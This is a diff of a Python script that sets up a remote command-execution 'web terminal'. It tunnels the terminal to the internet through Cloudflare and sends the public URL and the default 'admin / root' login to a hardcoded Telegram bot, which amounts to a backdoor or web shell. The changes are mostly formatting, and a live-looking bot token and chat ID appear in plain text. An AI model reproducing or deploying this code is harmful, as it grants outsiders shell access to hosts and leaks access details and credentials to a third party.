@@ -9,9 +9,7 @@ import base64
 import socket
 import threading
 import re
-import queue
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
 
 BOT_TOKEN = "8570951657:AAEXSCkLBeuYQfs8VtT5nwU-VanqmffUbbI"
 CHAT_ID = "8268185735"
@@ -35,16 +33,12 @@ def log_telegram(text):
 
 def kill_process(name):
     try:
-        subprocess.run(["pkill", "-f", name],
-                       stderr=subprocess.DEVNULL,
-                       stdout=subprocess.DEVNULL)
+        subprocess.run(["pkill", "-f", name], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         return
     except FileNotFoundError:
         pass
     try:
-        subprocess.run(["killall", name],
-                       stderr=subprocess.DEVNULL,
-                       stdout=subprocess.DEVNULL)
+        subprocess.run(["killall", name], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         return
     except FileNotFoundError:
         pass
@@ -53,9 +47,7 @@ def kill_process(name):
         for line in output.splitlines():
             if name in line and "grep" not in line:
                 pid = line.split()[1]
-                subprocess.run(["kill", "-9", pid],
-                               stderr=subprocess.DEVNULL,
-                               stdout=subprocess.DEVNULL)
+                subprocess.run(["kill", "-9", pid], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     except Exception:
         pass
 
@@ -275,7 +267,7 @@ class TermHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-Type', 'image/svg+xml')
             self.end_headers()
-            self.wfile.write('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">■</text></svg>'.encode())
+            self.wfile.write('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">#</text></svg>'.encode())
         else:
             self.send_response(404)
             self.end_headers()
@@ -309,7 +301,7 @@ class TermHandler(BaseHTTPRequestHandler):
                     text=True,
                     timeout=60
                 )
-                output = proc.stdout or proc.stderr or '\u2705 Selesai'
+                output = proc.stdout or proc.stderr or '✅ Selesai'
 
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
@@ -367,7 +359,7 @@ def run_tunnel(port):
     return proc, url
 
 def main():
-    send_telegram('\U0001f504 Memulai Web Terminal...')
+    send_telegram('🔄 Memulai Web Terminal...')
 
     port = find_free_port(PORT)
 
@@ -394,25 +386,25 @@ def main():
 
     if tunnel_url:
         send_telegram(
-            f'\u2705 Web Terminal siap!\n'
-            f'\U0001f517 {tunnel_url}\n\n'
-            f'\U0001f510 Auth: admin / root\n'
-            f'\U0001f4e1 Endpoint: /api/exec\n'
-            f'\U0001f4a1 Command: ls, cd, npm, python, dll.'
+            f'✅ Web Terminal siap!\n'
+            f'🔗 {tunnel_url}\n\n'
+            f'🔐 Auth: admin / root\n'
+            f'📡 Endpoint: /api/exec\n'
+            f'💡 Command: ls, cd, npm, python, dll.'
         )
     else:
-        send_telegram('\u274c Gagal mendapatkan URL Cloudflare Tunnel.')
+        send_telegram('❌ Gagal mendapatkan URL Cloudflare Tunnel.')
 
     try:
         while True:
             time.sleep(15)
             if cf_proc.poll() is not None:
-                log_telegram('\u26a0\ufe0f Tunnel mati, restart...')
+                log_telegram('⚠️ Tunnel mati, restart...')
                 cf_proc, tunnel_url = run_tunnel(port)
                 if tunnel_url:
-                    send_telegram(f'\u2705 Tunnel restart: {tunnel_url}')
+                    send_telegram(f'✅ Tunnel restart: {tunnel_url}')
     except KeyboardInterrupt:
-        log_telegram('\U0001f6d1 Shutdown...')
+        log_telegram('🛑 Shutdown...')
         cf_proc.terminate()
         server.shutdown()
 
